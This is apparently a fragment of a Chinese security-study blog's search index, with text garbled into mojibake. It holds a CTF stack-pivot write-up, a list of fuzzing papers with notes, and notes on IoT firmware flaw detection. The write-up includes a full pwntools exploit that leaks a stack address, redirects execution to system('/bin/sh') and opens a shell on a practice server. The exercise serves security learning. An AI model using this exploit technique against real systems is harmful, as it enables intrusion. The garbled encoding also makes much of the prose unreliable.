çš„åœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆè¾“å…¥å­—ç¬¦â€˜aaaaâ€™ï¼Œç„¶åçœ‹çœ‹æ ˆä¸­çš„æƒ…å†µ åœ¨ printf å‡½æ•°å‰æ‰“ä¸ªæ–­ç‚¹ï¼Œå› ä¸ºè¦å…ˆæ‰§è¡Œä¸€ä¸ª read å‡½æ•°è¾“å…¥â€˜aaaaâ€™ æˆ‘ä»¬è§‚å¯Ÿæ ˆä¸­çš„æƒ…å†µï¼Œeax å’Œ ecx æŒ‡å‘çš„åœ°æ–¹å°±æ˜¯ s çš„åœ°å€ï¼Œä½†æ˜¯è¿™ä¸ªåœ°å€æ˜¯æˆ‘ä»¬æœ¬åœ°åœ°å€ï¼Œä½ è¦æ‰“è¿œç¨‹ä¸»æœºä¸èƒ½ç”¨è¿™ä¸ªã€‚æ‰€ä»¥æˆ‘ä»¬è¦æƒ³æ–¹æ³•æš´éœ²ä¸€ä¸ªæ ˆä¸Šçš„åœ°å€ xï¼Œç„¶åç®— x å’Œ s çš„åç§» yï¼Œé‚£ä¹ˆ s çš„åœ°å€å°±æ˜¯ x+yã€‚ æˆ‘ä»¬å¯ä»¥çœ‹åˆ° ebp æŒ‡å‘çš„åœ°æ–¹å­˜äº†ä¸€ä¸ªåœ°å€ 0xffffd 008ï¼Œè¿™æ˜¯ä¸Šä¸€ä¸ªæ ˆå¸§çš„ ebpï¼Œå®ƒè·ç¦» s çš„åœ°å€çš„åç§»æ˜¯ 56ã€‚é‚£ä¹ˆå¦‚æœå¯ä»¥å°†å®ƒæš´éœ²ï¼Œå°±å¯ä»¥æ±‚å¾— s çš„åœ°å€äº†ã€‚ ç¨‹åºä¸­æœ‰ printf å‡½æ•°ï¼Œè¯¥å‡½æ•°åœ¨æœªé‡åˆ°ç»ˆæ­¢ç¬¦Â \u0026lsquo;\\0\u0026rsquo;æ—¶ä¼šä¸€ç›´è¾“å‡ºï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ printf å°†æ ˆä¸Šçš„å€¼è¾“å‡ºï¼Œå¾—åˆ° ebp æŒ‡å‘çš„å€¼ã€‚ 1 2 3 4 5 6 7 8 9 from pwn import * p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, 26588) payload1 = b\u0026#39;a\u0026#39; * 0x27 + b\u0026#39;b\u0026#39; p.send(payload1) # sendlineä¼šæœ‰ç»ˆæ­¢ç¬¦ p.recvuntil(\u0026#39;b\u0026#39;) s_addr = u32(p.recv(4)) - 56 print(hex(s_addr)) step 2 æ„é€  payload è¦å®ç°æ ˆè¿ç§»ï¼Œåªè¦æŠŠ ebp å’Œ return ä½ç½®è¦†ç›–ä¸ºç›®æ ‡åœ°å€å’Œ leave\u0026amp;ret åœ°å€å°± ok äº†ã€‚é‚£ä¹ˆè¿ç§»åçš„ fake æ ˆä¸Šåº”è¯¥å¦‚ä½•å¸ƒå±€å‘¢ã€‚ ç¨‹åºä¸­æœ‰ system å‡½æ•°ï¼Œä½†æ˜¯æ²¡æœ‰ bin/sh å­—ç¬¦ä¸²ã€‚é‚£ä¹ˆ fake æ ˆåº”è¯¥è¿™æ ·å¸ƒå±€ï¼š system_addr + fake_ret + bin_sh_addr + bin_sh_str ç»¼ä¸Šæ‰€è¿°ï¼Œæœ€ç»ˆçš„ payload åº”è¯¥æ˜¯ â€˜aaaaâ€™ + system_addr + fake_ret + bin_sh_addr + bin_sh_str + padding + s_addr + leave\u0026amp;ret_addr æœ€å‰é¢çš„ 4 ä¸ªå­—èŠ‚çš„ aaaa æ˜¯ä¸ºäº†æŠµæ¶ˆæ‰ leave æŒ‡ä»¤ä¸­ pop ebp å¯¼è‡´çš„ esp ä¸Šç§»ï¼Œä¸­é—´çš„ padding æ˜¯ä¸ºäº†è¡¥å…¨ 0x28 ä¸ªå­—èŠ‚ã€‚ å®Œæ•´çš„ expï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 from pwn import * p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, 26588) payload1 = b\u0026#39;a\u0026#39; * 0x27 + b\u0026#39;b\u0026#39; p.send(payload1) # sendlineä¼šæœ‰ç»ˆæ­¢ç¬¦ p.recvuntil(\u0026#39;b\u0026#39;) s_addr = u32(p.recv(4)) - 56 print(\u0026#39;s_addr: \u0026#39;, hex(s_addr)) system_addr = 0x08048400 leave_ret = 0x080484b8 payload2 = b\u0026#39;aaaa\u0026#39; + p32(system_addr) + b\u0026#39;aaaa\u0026#39; payload2 = payload2 + p32(s_addr + 0x10) payload2 = payload2 + b\u0026#39;/bin/sh\\x00\u0026#39; payload2 = payload2.ljust(0x28, b\u0026#39;a\u0026#39;) payload2 = payload2 + p32(s_addr) + p32(leave_ret) p.sendline(payload2) p.interactive() æ³¨æ„ payload2 ä¸­ bin/sh å­—ç¬¦ä¸²è¦åŠ ç»ˆæ­¢ç¬¦\n","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/ctf/pwn/%E6%A0%88%E8%BF%81%E7%A7%BB/","summary":"å‚è€ƒï¼šæ ˆè¿ç§»åŸç†ä»‹ç»ä¸åº”ç”¨ - Max1z - åšå®¢å›­ (cnblogs.com)ï¼ˆè¿™ç¯‡å†™çš„åŠå…¶è¯¦ç»†ï¼‰ é€‚ç”¨åœºæ™¯ å½“æ ˆä¸Šçš„ç©ºé—´ï¼Œæˆ–è€…ç¨‹åºçš„è¾“å…¥å­—ç¬¦æ•°é‡ä¸å¤Ÿæˆ‘ä»¬è¿›è¡Œ","title":"æ ˆè¿ç§»"},{"content":"2023-06-22 16:07 L2Fuzz: Discovering Bluetooth L2CAP Vulnerabilities Using Stateful Fuzz Testing.\tDSN\t2022\nå…³äºè“ç‰™è®¾å¤‡çš„fuzz è§£å†³çš„é—®é¢˜ï¼šä¸èƒ½æœ‰æ•ˆåœ°ç”Ÿæˆè“ç‰™çš„ç•¸å½¢æ•°æ®åŒ… æœ¬æ–‡æå‡ºçš„æ–¹æ³•ç”Ÿæˆçš„ç•¸å½¢æ•°æ®åŒ…æ•°é‡å¢åŠ äº†46å€ï¼Œæ•°æ®åŒ…æ‹’ç»ç‡å¤§å¤§é™ä½ï¼›ä»å…«ä¸ªçœŸå®è“ç‰™è®¾å¤‡ä¸­æ£€æµ‹åˆ°äº”ä¸ªé›¶æ—¥æ¼æ´ Torpedo: A Fuzzing Framework for Discovering Adversarial Container Workloads.\tDSN\t2022\næå‡ºä¸€ç§æ–¹æ³•æ£€æµ‹å®¹å™¨ä¸­å¼‚å¸¸çš„å·¥ä½œè´Ÿè½½ Towards Fuzzing Target Lines.\tDSN\t2022\nåœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å»ºè®®æ”¹è¿›è¿™äº›æƒ³æ³•ï¼Œä½¿æ¨¡ç³Šå™¨ä¸“æ³¨äºä»£ç çš„ç‰¹å®šéƒ¨åˆ† (å³è¡Œ)ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºç›®æ ‡ï¼Œé¿å…åœ¨å…¶ä»–åŒºåŸŸæµªè´¹èµ„æºã€‚ FUZZILLI: Fuzzing for JavaScript JIT Compiler Vulnerabilities.\tNDSS\t2023\nå…ˆå‰çš„ç ”ç©¶ä¸æ˜¯ä¸ºäº†ç”ŸæˆçœŸæ­£è§¦å‘JITè¯­ä¹‰çš„æºä»£ç è€Œè®¾è®¡çš„ã€‚ æå‡ºäº†ç¬¬ä¸€ä¸ªä¸“æ³¨äºJITæ¼æ´çš„æ¨¡ç³Šå™¨ No Grammar, No Problem: Towards Fuzzing the Linux Kernel without System-Call Descriptions.\tNDSS\t2023\nå…ˆå‰çš„ç ”ç©¶syzkaller è¿‡äºä¾èµ–è¯­æ³• FuzzNGä¸éœ€è¦å¤æ‚çš„ç³»ç»Ÿè°ƒç”¨æ¥å£æè¿°æ¥å®ç°åŠŸèƒ½ã€‚ç›¸åï¼ŒFuzzNGåˆ©ç”¨åŸºæœ¬çš„å†…æ ¸è®¾è®¡ç‰¹æ€§æ¥é‡å¡‘å’Œç®€åŒ–æ¨¡ç³Šå™¨çš„è¾“å…¥ç©ºé—´ã€‚å¯¹äºæ¯ä¸ªæ–°ç›®æ ‡ï¼ŒFuzzNGåªéœ€è¦ä¸€ä¸ªå°çš„é…ç½®: æœ¬è´¨ä¸Šæ˜¯fuzzeråº”è¯¥æ¢ç´¢çš„æ–‡ä»¶å’Œç³»ç»Ÿè°ƒç”¨å·åˆ—è¡¨ã€‚ DARWIN: Survival of the Fittest Fuzzing Mutators.\tNDSS\t2023\nå…ˆå‰ç ”ç©¶çš„fuzzå¯¹ç§å­è°ƒåº¦ä¼˜åŒ–æ•ˆæœä¸æ˜æ˜¾ã€çªå˜è°ƒåº¦éœ€è¦çš„ä¸“ä¸šçŸ¥è¯†å¤ªå¤š æå‡ºä¸€ç§æ–°çš„çªå˜è°ƒåº¦å™¨ä¸éœ€è¦å¼•å…¥ç”¨æˆ·å¯é…ç½®å‚æ•° LOKI: State-Aware Fuzzing Framework for the Implementation of Blockchain Consensus Protocols.\tNDSS\t2023\nç°æœ‰fuzzæ— æ³•å¤„ç†åˆ†å¸ƒå¼ç»“ç‚¹çš„å¤æ‚å…±è¯†çŠ¶æ€ï¼Œä»è€Œäº§ç”Ÿå¤§é‡æ— ç”¨çš„æ•°æ®åŒ… æå‡ºäº†ä¸€å…±å…±è¯†åè®®æ¨¡ç³Šæ¡†æ¶ FuzzOrigin: Detecting UXSS vulnerabilities in Browsers through Origin Fuzzing\tUSENIX\t2022\néš¾ä»¥ä½¿ç”¨æ¨¡ç³Šæµ‹è¯•æ£€æµ‹uxssæ¼æ´ï¼šuxssæ˜¯ä¸ªè¯­ä¹‰æ¼æ´ã€å¾ˆéš¾ç”Ÿæˆè§¦å‘UXSSçš„HTMLè¾“å…¥ï¼Œå› ä¸ºéœ€è¦é©±åŠ¨æµè§ˆå™¨æ‰§è¡Œå¤æ‚çš„äº¤äº’å’Œå¯¼èˆª æå‡ºäº†ä¸€ç§ç”¨äºæ£€æµ‹UXSSæ¼æ´çš„æµè§ˆå™¨æ¨¡ç³Šå™¨FuzzOrigin BrakTooth: Causing Havoc on Bluetooth Link Manager via Directed Fuzzing\tUSENIX\t2022\nå®šå‘æ¨¡ç³Šè“ç‰™ AmpFuzz: Fuzzing for Amplification DDoS Vulnerabilities\tUSENIX\t2022\né’ˆå¯¹DDOSçš„æ¨¡ç³Šæµ‹è¯• Morphuzz: Bending (Input) Space to Fuzz Virtual Devices\tUSENIX\t2022 Fuzzware: Using Precise MMIO Modeling for Effective Firmware Fuzzing\tUSENIX\t2022 MundoFuzz: Hypervisor Fuzzing with Statistical Coverage Testing and Grammar Inference\tUSENIX\t2022\nä¸€ä¸ªè™šæ‹Ÿæœºç›‘æ§ç¨‹åºæ¨¡ç³Šå™¨ï¼Œå¯ä»¥å®ç°è¦†ç›–å¼•å¯¼å’Œè¯­æ³•æ„ŸçŸ¥çš„æ¨¡ç³Šæµ‹è¯•ã€‚ Drifuzz: Harvesting Bugs in Device Drivers from Golden Seeds\tUSENIX\t2022\næå‡ºä¸€ç§é’ˆå¯¹WIFIå’Œä»¥å¤ªç½‘é©±åŠ¨ç¨‹åºçš„æ— ç¡¬ä»¶ç¬¦å·æ‰§è¡Œå¢å¼ºæ¨¡ç³Šå™¨ æå‡ºä¸€ç§ç”Ÿæˆé«˜è´¨é‡åˆå§‹ç§å­çš„æŠ€æœ¯ï¼Œè¯¥æŠ€æœ¯å…è®¸æ¨¡ç³Šæµ‹è¯•åœ¨é©±åŠ¨ç¨‹åºåˆå§‹åŒ–æœŸé—´ç»•è¿‡å›°éš¾çš„ä»£ç ç»“æ„ SGXFuzz: Efficiently Synthesizing Nested Structures for SGX Enclave Fuzzing\tUSENIX\t2022\né’ˆå¯¹sgxçš„fuzz SyzScope: Revealing High-Risk Security Impacts of Fuzzer-Exposed Bugs in Linux kernel\tUSENIX\t2022\nå…ˆå‰ç ”ç©¶å¿½ç•¥äº†å¯¹å®‰å…¨å½±å“çš„è¯„ä¼°ï¼Œç¼ºä¹å¯¹å®‰å…¨å½±å“çš„ç†è§£å¯èƒ½å¯¼è‡´é”™è¯¯ä¿®å¤å»¶è¿Ÿä»¥åŠè¡¥ä¸ä¼ æ’­ã€‚ å¼€å‘äº†syzscopeï¼Œå¯ä»¥ä»çœ‹ä¼¼ä½é£é™©çš„bugä¸­è‡ªåŠ¨å‘ç°é«˜é£é™©å½±å“ TheHuzz: Instruction Fuzzing of Processors Using Golden-Reference Models for Finding Software-Exploitable Vulnerabilities\tUSENIX\t2022\næå‡ºä¸€ç§é’ˆå¯¹ç¡¬ä»¶çš„æ¨¡ç³Šå™¨ Fuzzing Hardware Like Software\tUSENIX\t2022\nå°†RTLç¡¬ä»¶è½¬æ¢ä¸ºè½¯ä»¶æ¨¡å‹ï¼Œå¹¶ä»¥è½¯ä»¶æ¨¡ç³Šçš„æ–¹æ³•åŒºæ¨¡ç³Šè¯¥æ¨¡å‹ ä¸»è¦æ˜¯é’ˆå¯¹èŠ¯ç‰‡çš„æ¨¡ç³Š Stateful Greybox Fuzzing\tUSENIX\t2022\nä¸€ä¸ªå…³é”®çš„æŒ‘æˆ˜æ˜¯åœ¨æ²¡æœ‰æ˜¾å¼åè®®è§„èŒƒçš„æƒ…å†µä¸‹è¦†ç›–çŠ¶æ€ç©ºé—´ã€‚ æ²¡çœ‹æ‡‚æ‘˜è¦è¯´çš„å•¥ StateFuzz: System Call-Based State-Aware Linux Driver Fuzzing\tUSENIX\t2022\nä½œè€…è®¤ä¸ºç°æœ‰çš„è¦†ç›–ç‡æŒ‡å¯¼çš„æ¨¡ç³Šæµ‹è¯•è€…é€šå¸¸å€¾å‘äºä½¿ç”¨æ–°ä»£ç çš„æµ‹è¯•ç”¨ä¾‹ï¼Œè€Œæ”¾å¼ƒä½¿ç”¨ç›¸åŒä»£ç çš„æµ‹è¯•ç”¨ä¾‹ã€‚ç„¶è€Œï¼Œè¿™æ ·çš„ç­–ç•¥å¹¶ä¸æ˜¯æœ€ä¼˜çš„ã€‚ä½¿ç”¨ç›¸åŒä»£ç çš„æ–°æµ‹è¯•ç”¨ä¾‹å¯èƒ½æ¯”ä»¥å‰çš„æµ‹è¯•ç”¨ä¾‹æ›´å¥½ï¼Œå› ä¸ºå®ƒå¯èƒ½è§¦å‘å¯¹ä»£ç æ¢ç´¢å’Œbugå‘ç°æœ‰ç”¨çš„æ–°ç¨‹åºçŠ¶æ€ã€‚ è¯„ä¼°äº†è¦†ç›–å¼•å¯¼æ¨¡ç³Šè§£å†³æ–¹æ¡ˆçš„å±€é™æ€§ï¼Œå¹¶æå‡ºäº†ä¸€ä¸ªçŠ¶æ€æ„ŸçŸ¥æ¨¡ç³Šè§£å†³æ–¹æ¡ˆStateFuzzæ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ FIXREVERTER: A Realistic Bug Injection Methodology for Benchmarking Fuzz Testing\tUSENIX\t2022\nä¸ºäº†è¯„ä¼°æ¨¡ç³Šæµ‹è¯•å™¨çš„æ•ˆæœï¼Œæœ¬æ–‡ä»‹ç»äº†FIXREVERTERï¼Œä¸€ä¸ªè‡ªåŠ¨åœ¨ç¨‹åºä¸­æ³¨å…¥çœŸå®é”™è¯¯çš„å·¥å…·ã€‚ JIGSAW: Efficient and Scalable Path Constraints Fuzzing\tS\u0026amp;P\t2022\nå¯¹è¦†ç›–å¼•å¯¼çš„fuzzçš„æé«˜ï¼Œä¸»è¦æ˜¯æé«˜fuzzçš„ååé‡ BEACON: Directed Grey-Box Fuzzing with Provable Path Pruning\tS\u0026amp;P\t2022\næå‰ä¿®å‰ªä¸å¯è¾¾è·¯å¾„ FuzzUSB: Hybrid Stateful Fuzzing of USB Gadget Stacks\tS\u0026amp;P\t2022\nå¯¹USBçš„fuzz PATA: Fuzzing with Path Aware Taint Analysis\tS\u0026amp;P\t2022\né€šè¿‡æ±¡ç‚¹åˆ†ææ¥åŠ å¼ºfuzz Effective Seed Scheduling for Fuzzing with Graph Centrality Analysis\tS\u0026amp;P\t2022\nç§å­è°ƒåº¦ç®—æ³• Fuzzing@Home : Distributed Fuzzing on Untrusted Heterogeneous Clients\tRAID\t2022\nå…¬å…±åä½œæ¨¡ç³Šç½‘ç»œ USENIX USENIX | The Advanced Computing Systems Association\n2023 AIFORE Smart Fuzzing Based on Automatic Input Format Reverse Engineering POLYFUZZ Holistic Greybox Fuzzing of Multi-Language Systems 2022 BrakTooth Causing Havoc on Bluetooth Link MORPHUZZ Bending (Input) Space to Fuzz Virtual Devices 2021 ICSFuzz Manipulating IOs and Repurposing Binary Code CCS ACM CCS (sigsac.org)\n2017 SemFuzz: Semantics-based Automatic Generation of Proof-of-Concept Exploits IEEE N\u0026amp;P IEEE TCSP (ieee-security.org)\n2022 Effective Seed Scheduling for Fuzzing with Graph Centrality Analysis BEACON : Directed Grey-Box Fuzzing with Provable Path Pruning PATA: Fuzzing with Path Aware Taint Analysis JIGSAW: Efficient and Scalable Path Constraints Fuzzing 2021 Extractor: Extracting Attack Behavior from Threat Reports å¨èƒæŠ¥å‘Šä¸­æå–æ”»å‡»è¡Œä¸º 2016 SeededFuzz: Selecting and Generating Seeds for Directed Fuzzing NDSS Network and Distributed System Security (NDSS) Symposium (ndss-symposium.org)\n2022 EMS: History-Driven Mutation for Coverage-based Fuzzing MobFuzz: Adaptive Multi-objective Optimization in Gray-box Fuzzing Semantic-Informed Driver Fuzzing Without Both the Hardware Devices and the Emulators Fuzzing-å­¦ä¹ èµ„æºæ±‡æ€» Â· GitBook (scubsrgroup.github.io)\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/idea/%E5%88%86%E7%B1%BB/","summary":"2023-06-22 16:07 L2Fuzz: Discovering Bluetooth L2CAP Vulnerabilities Using Stateful Fuzz Testing. DSN 2022 å…³äºè“ç‰™è®¾å¤‡çš„fuzz è§£å†³çš„é—®é¢˜ï¼šä¸èƒ½æœ‰æ•ˆåœ°ç”Ÿæˆè“ç‰™çš„ç•¸å½¢æ•°æ®åŒ… æœ¬æ–‡æå‡ºçš„æ–¹æ³•ç”Ÿæˆçš„ç•¸å½¢æ•°æ®åŒ…æ•°é‡å¢åŠ äº†46å€ï¼Œæ•°","title":"æ¨¡ç³Šæµ‹è¯•åˆ†ç±»"},{"content":"ä¸­æ–‡è¯‘åï¼š ä½œè€…ï¼šå¼ å¼› å•ä½ï¼šè®¡ç®—æœºè½¯ä»¶æ–°æŠ€æœ¯å›½å®¶é‡ç‚¹å®éªŒå®¤ (å—äº¬å¤§å­¦) å›½å®¶ï¼š #ä¸­å›½ å¹´ä»½ï¼š #2021å¹´ æ¥æºï¼š #ä¿¡æ¯å®‰å…¨å­¦æŠ¥ å…³é”®å­—ï¼š #ç»¼è¿° #åµŒå…¥å¼ ç¬”è®°å»ºç«‹æ—¶é—´ï¼š 2023-02-02 : 21:12\næ‘˜è¦ å½’çº³å…¸å‹ç‰©è”ç½‘å›ºä»¶å®ç°ç¼ºé™·ç±»å‹ã€äº§ç”Ÿæœºç† è¯„ä»·é™æ€åˆ†æã€ç¬¦å·æ‰§è¡Œã€æ¨¡ç³Šæµ‹è¯•ã€ç¨‹åºéªŒè¯ã€åŸºäºæœºå™¨å­¦ä¹ çš„æ–¹æ³• å¼•è¨€ IEEE æ ‡å‡† 12207-2008 å°†å›ºä»¶å®šä¹‰ä¸ºâ€œç¡¬ä»¶è®¾å¤‡å’Œä»¥åªè¯»è½¯ä»¶å½¢å¼å­˜å‚¨äºç¡¬ä»¶è®¾å¤‡ä¸­çš„è®¡ç®—æœºæŒ‡ä»¤å’Œæ•°æ®çš„ç»“åˆâ€ã€‚ å›ºä»¶åˆ†ä¸ºä¸‰ç±» å•ç‰‡å›ºä»¶, é€šå¸¸é‡‡å–å•ä¸ªäºŒè¿›åˆ¶é•œåƒçš„å½¢å¼, æ— éœ€åº•å±‚æ“ä½œç³»ç»Ÿ, ç›´æ¥åŸºäºåº•å±‚ç¡¬ä»¶é©±åŠ¨å®Œæˆæ‰€æœ‰åŠŸèƒ½, æˆ–è€…åªåŒ…å«éƒ¨åˆ†ç³»ç»Ÿçš„åº“; åŸºäº Linux çš„å›ºä»¶, ä»¥ Linux ä½œä¸ºåº•å±‚çš„ç³»ç»Ÿ, åŸºäº Linux è¿›è¡Œå¼€å‘; åŸºäº RTOS çš„å›ºä»¶ã€‚RTOS (real-time operating system) æ˜¯æŒ‡å®æ—¶å¤„ç†æ•°æ®ã€æ²¡æœ‰ç¼“å†²å»¶è¿Ÿçš„æ“ä½œç³»ç»Ÿã€‚ å›ºä»¶ä¸­å­˜åœ¨ç¼ºé™·æ˜¯é€ æˆç‰©è”ç½‘è®¾å¤‡é­å—å®‰å…¨æ”»å‡»çš„æ ¹æœ¬åŸå› ä¹‹ä¸€ã€‚ æŒ‘æˆ˜ï¼š æ— æ³•è·å–æºç ä¸”ä»£ç ç±»å‹å¤æ‚ ä¸åŒç±»å‹çš„å›ºä»¶å·®åˆ«è¾ƒå¤§ æµ‹è¯•ç”¨ä¾‹éš¾ä»¥æ„å»º ä¾èµ–èµ„æºåŠæŠ€æœ¯ä¸è¶³ å›ºä»¶ç¼ºé™·åŠå…¶æœºç†åˆ†æ å›ºä»¶ä¸­çš„ç¼ºé™·å¯ä»¥åˆ†ä¸ºå®ç°ç¼ºé™·ã€é…ç½®ç¼ºé™·å’Œå®šåˆ¶ç¼ºé™·ã€‚\nå®ç°ç¼ºé™· å†…å­˜æŸåç±»ç¼ºé™·ï¼šå†…å­˜æŸåç±»ç¼ºé™·æŒ‡ä¸æ­£ç¡®çš„å†…å­˜è®¿é—®å¯¼è‡´å †ã€æ ˆå†…å­˜å‘ç”Ÿé”™è¯¯ã€‚ å‘½ä»¤æ³¨å…¥ç¼ºé™·ï¼šå‘½ä»¤æ³¨å…¥ç¼ºé™·æŒ‡ç”±äºç¼ºå°‘å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œå®Œå¤‡çš„æ£€æŸ¥å¯¼è‡´æ¶æ„ç”¨æˆ·å¯ä»¥é€šè¿‡æ„é€ è¾“å…¥æ¥è¿è¡Œéé¢„æœŸçš„å‘½ä»¤ã€‚ ç¨‹åºé€»è¾‘ç¼ºé™·ï¼šç¨‹åºé€»è¾‘ç¼ºé™·æ˜¯æŒ‡ç¨‹åºä¸ä¸¥è°¨çš„é€»è¾‘æ‰€ç•™ä¸‹çš„ç¼ºé™·, ä½¿è½¯ä»¶æ— æ³•æ­£å¸¸è¿è¡Œæˆ–ç»™äº†ä¸æ³•åˆ†å­å¯ä¹˜ä¹‹æœºã€‚ å¹¶å‘é—®é¢˜ç¼ºé™·ï¼šå¹¶å‘é—®é¢˜ç¼ºé™·æŒ‡å¯¹å¤šçº¿ç¨‹è¿è¡Œçš„å›ºä»¶è®¾è®¡ä¸åˆç†å¯¼è‡´å›ºä»¶è¿è¡Œæ—¶äº§ç”Ÿæ•°æ®ç«äº‰ã€æ­»é”ç­‰è¡Œä¸ºã€‚ é…ç½®ç¼ºé™· å›ºä»¶ä¸Šçš„é…ç½®ç¼ºé™·ç›®å‰å­¦æœ¯ç•Œç ”ç©¶ç¼ºå¤±, ä½†å¤§å‹è½¯ä»¶ç³»ç»Ÿå’Œäº‘ç³»ç»Ÿä¸­éƒ½æœ‰è¾ƒå¤šç ”ç©¶, è¿™äº›ç ”ç©¶å¯¹å›ºä»¶é…ç½®ç¼ºé™·æ£€æµ‹æˆ–è®¸ä¼šæœ‰å¯å‘ã€‚\nåŠŸèƒ½é…ç½®å‚æ•°ç¼ºé™· æ€§èƒ½é…ç½®å‚æ•°ç¼ºé™·ï¼šè¿™ç±»ç¼ºé™·é€šå¸¸ä¸ä¼šç›´æ¥å¼•èµ·ç³»ç»ŸæŒ‚èµ·ã€å´©æºƒç­‰å¼‚å¸¸è¡Œä¸º, ä½†æ˜¯æ— æ³•æä¾›ç³»ç»Ÿé¢„æœŸçš„æ€§èƒ½, æ— æ³•æ»¡è¶³ç”¨æˆ·çš„éœ€æ±‚ æƒé™é…ç½®å‚æ•°ç¼ºé™· å®šåˆ¶ç¼ºé™· ^6e21ca å›ºä»¶å®‰å…¨ç¼ºé™·æ£€æµ‹æŠ€æœ¯ ç›®å‰ä¸»æµçš„è‡ªåŠ¨åŒ–ç¼ºé™·æ£€æµ‹æŠ€æœ¯å¯ä»¥åˆ†ä¸ºäº”ç±», åˆ†åˆ«æ˜¯é™æ€åˆ†æã€ç¬¦å·æ‰§è¡Œã€æ¨¡ç³Šæµ‹è¯•ã€ç¨‹åºéªŒè¯ã€æœºå™¨å­¦ä¹ .\né™æ€åˆ†æ PIE æ€»ç»“äº†å›ºä»¶é€šä¿¡åè®®ä»£ç çš„ç‰¹å¾ï¼Œå€ŸåŠ©æœºå™¨å­¦ä¹ ç®—æ³•é«˜æ•ˆè¯†åˆ«æœªçŸ¥å›ºä»¶çš„é€šä¿¡åè®®ä»£ç å— DTaint é€šè¿‡æ±¡ç‚¹åˆ†æåˆæ­¥è§£å†³äº†é™æ€åˆ†ææŠ€æœ¯æ‰©å±•æ€§å·®çš„é—®é¢˜ å•çº¯çš„é™æ€åˆ†ææ— æ³•è·å–å‡†ç¡®çš„æ±¡ç‚¹ä¼ æ’­æƒ…å†µ, å®¹æ˜“é€ æˆå¤§é‡çš„è¯¯æŠ¥, å¯æ‰©å±•æ€§è¾ƒå·®ã€‚Saluki é€šè¿‡ â€œè¿è¡Œâ€ä»£ç ç‰‡æ®µæ¥æé«˜æ±¡ç‚¹åˆ†æçš„ç²¾åº¦ KARONTE åœ¨å¯¹å›ºä»¶è¿›è¡Œåˆ†ææ—¶è€ƒè™‘äº†å›ºä»¶ä¸åŒç»„ä»¶ä¹‹é—´çš„äº¤äº’å’Œæ•°æ®æµåŠ¨, å¤§å¤§é™ä½äº†æ±¡ç‚¹åˆ†æçš„è¯¯æŠ¥ã€‚ ç¬¦å·æ‰§è¡Œ ç‰¹å®šæ¶æ„çš„åˆ†æ Davidson ç­‰äºº[49] æå‡ºäº†åŸºäºç¬¦å·æ‰§è¡Œå¼•æ“ KLEE çš„ç¬¦å·æ‰§è¡Œå·¥å…· FIE, å®ç°äº†å¯¹åŸºäº MSP430 ç³»åˆ—å¾®æ§åˆ¶å™¨çš„å›ºä»¶ç¨‹åºæœ‰æ•ˆç¼ºé™·æ£€æµ‹ã€‚ Hernandez ç­‰äºº[50] åŸºäº FIE, é€šè¿‡åŠ å…¥å¯¹ Intel 8051 MCU çš„æ”¯æŒ, å®ç°äº†é’ˆå¯¹ USB å›ºä»¶çš„ç¬¦å·æ‰§è¡Œåˆ†ææ¡†æ¶ FirmUSB ç‰¹å®šç¼ºé™·çš„åˆ†æ Oleksandr ç­‰äºº[51]æå‡ºä¸€ç§åŸºäº KLEE çš„ç¬¦å·æ‰§è¡Œå·¥å…·, ç”¨æ¥åˆ†æ BIOS ä¸­ SMM ä¸­æ–­å¤„ç†ç¨‹åºçš„å±é™©å†…å­˜å¼•ç”¨ã€‚ Ya n ç­‰äºº[52]æå‡ºåˆ©ç”¨ç¬¦å·æ‰§è¡ŒæŠ€æœ¯æ¥æŸ¥æ‰¾äºŒè¿›åˆ¶å›ºä»¶ä¸­èº«ä»½éªŒè¯ç»•è¿‡ç¼ºé™·, å¹¶å®ç°äº†åˆ†ææ¡†æ¶ Firmaliceã€‚ é€šç”¨åˆ†ææ¡†æ¶ ä¸ºäº†æ”¯æŒæ›´å¤šå›ºä»¶ä»£ç çš„å¤„ç†, Corteggiani ç­‰äºº[53]åŸºäº KLEE å¼€å‘äº†é’ˆå¯¹å›ºä»¶ä»£ç çš„ç¬¦å·æ‰§è¡Œæ¡†æ¶ Inception, æ­¤å·¥ä½œä¸€å®šç¨‹åº¦ä¸Šæ¶ˆé™¤äº†å¹³å°çš„å·®å¼‚ã€‚ ç¬¦å·æ‰§è¡Œéœ€è¦è§£å†³çš„ç—›ç‚¹åœ¨äºéœ€è¦æºç ï¼Œå¦‚ä½•å®ç°ç›´æ¥ä»¥äºŒè¿›åˆ¶å›ºä»¶ä½œä¸ºè¾“å…¥è¿›è¡Œåˆ†æã€‚ æ¨¡ç³Šæµ‹è¯• æŒ‰ç…§å›ºä»¶è¿è¡Œçš„ç¯å¢ƒ, ç°æœ‰æ¨¡ç³Šæµ‹è¯•æŠ€æœ¯å¯ä»¥åˆ†ä¸ºåŸºäºçœŸå®è®¾å¤‡ä»¥åŠåŸºäºæ¨¡æ‹Ÿæ‰§è¡Œç¯å¢ƒçš„æ¨¡ç³Šæµ‹è¯•ã€‚\nåŸºäºçœŸå®è®¾å¤‡ç¯å¢ƒçš„æ¨¡ç³Šæµ‹è¯• Sara ç­‰äºº[28]æå‡ºäº†ä¸€ç§è¿è¡Œæ—¶éªŒè¯å·¥å…·æ¥æ£€æµ‹ FreeRTOS ä¸­çš„å¹¶å‘ç¼ºé™·ã€‚åŸºäºè¿è¡Œæ—¥å¿—æ¥è¿›è¡Œåˆ†æ RPFuzzer[56]æ˜¯ä¸€ä¸ªç”¨äºæ£€æµ‹è·¯ç”±åè®®ç¼ºé™·çš„æ¡†æ¶, é€šè¿‡å‘çœŸå®è®¾å¤‡å‘é€å¤§é‡æ•°æ®åŒ…, ç›‘æ§ CPU ä½¿ç”¨ä¸æŸ¥çœ‹ç³»ç»Ÿæ—¥å¿—, è¿›è€Œæ£€æµ‹è®¾å¤‡é‡å¯ä¸æ‹’ç»æœåŠ¡æ¼æ´ 